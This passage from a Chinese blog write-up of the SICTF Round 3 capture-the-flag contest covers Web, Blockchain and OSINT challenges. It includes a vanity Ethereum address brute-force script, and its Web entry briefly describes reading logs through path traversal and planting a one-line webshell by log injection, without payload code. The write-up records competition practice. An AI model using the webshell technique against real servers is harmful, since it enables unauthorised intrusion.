<span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure>
<h1>Misc</h1>
<h2 id="签到">签到</h2>
<h1>Web</h1>
<h3 id="100-upload">100%_upload</h3>
<p>可目录穿越读到日志</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2013.png" alt="Untitled"></p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2014.png" alt="Untitled"></p>
<p>日志注入写一句话马，蚁剑连接获取flag</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2015.png" alt="Untitled"></p>
<h1>Blockchain</h1>
<h2 id="CheckinNewYear">CheckinNewYear</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: shu shao de xiao mi di</span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line">contract HappyNewYear&#123;</span><br><span class="line">    string private NewYear;</span><br><span class="line">    constructor(string memory _newyear )  &#123;</span><br><span class="line">        NewYear = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    function happyNewYear(string memory _newYear) public payable &#123;</span><br><span class="line">        require(uint160(msg.sender) |</span><br><span class="line">        <span class="number">2</span>**<span class="number">16</span> * <span class="number">3</span>**<span class="number">3</span> * <span class="number">5</span> * <span class="number">7</span> * <span class="number">13</span> * <span class="number">17</span> * <span class="number">19</span> * <span class="number">37</span> * <span class="number">73</span> * <span class="number">97</span> * <span class="number">109</span> * <span class="number">241</span> * <span class="number">257</span> * <span class="number">433</span> * <span class="number">577</span> * <span class="number">673</span> * <span class="number">38737</span> * <span class="number">487824887233</span> ==</span><br><span class="line">        <span class="number">2</span>**<span class="number">2</span> * <span class="number">17</span> * <span class="number">67</span> * <span class="number">733</span> * <span class="number">316139</span> * <span class="number">18992431891</span> * <span class="number">72887484710091183279372959</span></span><br><span class="line">        ,<span class="string">&quot;Not this Year&quot;</span>);</span><br><span class="line">        NewYear = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       function isSolved() public view returns (<span class="built_in">bool</span>)&#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(NewYear)) == keccak256(abi.encodePacked(<span class="string">&quot;Happy&quot;</span>)),<span class="string">&quot;not HappyNewYear&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求msg.sender是0x2024结尾的，爆一下地址就能找到，添加钱包之后remix ide发送Happy就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_keys <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mine_eth_address</span>(<span class="params">suffix</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="comment"># Generate a new private key</span></span><br><span class="line">        private_key_bytes = os.urandom(<span class="number">32</span>)</span><br><span class="line">        private_key = keys.PrivateKey(private_key_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get the corresponding public key</span></span><br><span class="line">        public_key = private_key.public_key</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Derive the Ethereum address from the public key</span></span><br><span class="line">        eth_address = public_key.to_checksum_address()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Check if the address ends with the specified suffix</span></span><br><span class="line">        <span class="keyword">if</span> eth_address.endswith(suffix):</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Address: <span class="subst">&#123;eth_address&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Private Key: <span class="subst">&#123;private_key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Trying address <span class="subst">&#123;eth_address&#125;</span>...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> eth_address, private_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the script with the desired suffix (&#x27;2024&#x27;)</span></span><br><span class="line">mine_eth_address(<span class="string">&#x27;2024&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1>Forensics</h1>
<h3 id="OSINT签到"><strong>OSINT签到</strong></h3>
<p>有椰子树，猜是海南</p>
<p><a target="_blank" rel="noopener" href="http://guoqing.china.com.cn/2018-10/11/content_65573660.htm">http://guoqing.china.com.cn/2018-10/11/content_65573660.htm</a></p>
<p>网上找到个差不多一样的</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2016.png" alt="Untitled"></p>
<h3 id="树木的压迫"><strong>树木的压迫</strong></h3>
<p>也是一样，网上找到差不多的图片</p>
<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/679307641_121687424">https://www.sohu.com/a/679307641_121687424</a></p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2017.png" alt="Untitled"></p>
<p>标题为四川达州，打开百度地图仔细找一下类似体育场的就行</p>
<h3 id="真的签到"><strong>真的签到</strong></h3>
<p>抖音找到个类似的摩天轮</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%2018.png" alt="Untitled"></p>
<p>打开地图在周围确认一下发现一样</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/writeup/" rel="tag"># writeup</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/11/29/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/" rel="prev" title="信息内容安全概论">
      <i class="fa fa-chevron-left"></i> 信息内容安全概论
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/05/17/malloc%E6%BA%90%E7%A0%81/" rel="next" title="malloc源码分析">
      malloc源码分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">排名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TalkBoom"><span class="nav-number">2.1.</span> <span class="nav-text">TalkBoom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bug-Zapper-Pro"><span class="nav-number">2.2.</span> <span class="nav-text">Bug_Zapper_Pro+</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Eeeeasy-Cpp"><span class="nav-number">2.3.</span> <span class="nav-text">Eeeeasy_Cpp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#overflow"><span class="nav-number">2.4.</span> <span class="nav-text">overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bug-Zapper"><span class="nav-number">2.5.</span> <span class="nav-text">Bug_Zapper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-SI"><span class="nav-number">2.6.</span> <span class="nav-text">Easy_SI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack"><span class="nav-number">2.7.</span> <span class="nav-text">stack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CloseMe"><span class="nav-number">3.1.</span> <span class="nav-text">CloseMe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SweetTofu"><span class="nav-number">3.2.</span> <span class="nav-text">SweetTofu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ez-pyc"><span class="nav-number">3.3.</span> <span class="nav-text">Ez_pyc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Battle-City"><span class="nav-number">3.4.</span> <span class="nav-text">Battle City</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ArtBreaker"><span class="nav-number">3.5.</span> <span class="nav-text">ArtBreaker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-C"><span class="nav-number">3.6.</span> <span class="nav-text">Baby_C++</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vigenere"><span class="nav-number">4.1.</span> <span class="nav-text">Vigenere</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SuperRSA"><span class="nav-number">4.2.</span> <span class="nav-text">SuperRSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">5.1.</span> <span class="nav-text">签到</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#100-upload"><span class="nav-number">6.0.1.</span> <span class="nav-text">100%_upload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">Blockchain</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CheckinNewYear"><span class="nav-number">7.1.</span> <span class="nav-text">CheckinNewYear</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">8.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#OSINT%E7%AD%BE%E5%88%B0"><span class="nav-number">8.0.1.</span> <span class="nav-text">OSINT签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%91%E6%9C%A8%E7%9A%84%E5%8E%8B%E8%BF%AB"><span class="nav-number">8.0.2.</span> <span class="nav-text">树木的压迫</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%E7%9A%84%E7%AD%BE%E5%88%B0"><span class="nav-number">8.0.3.</span> <span class="nav-text">真的签到</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hkbin"
      src="/images/header.png">
  <p class="site-author-name" itemprop="name">hkbin</p>
  <div class="site-description" itemprop="description">hkbin hkbin hkbin</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">38</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/17779938@qq.com" title="QQ → 17779938@qq.com"><i class="fab fa-stack-overflow fa-fw"></i>QQ</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/Hkhanbing" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hkhanbing" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hkbin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">136k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">2:04</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>
    <script defer src="/lib/three/canvas_lines.min.js"></script>


  















  

  

  

</body>
</html>
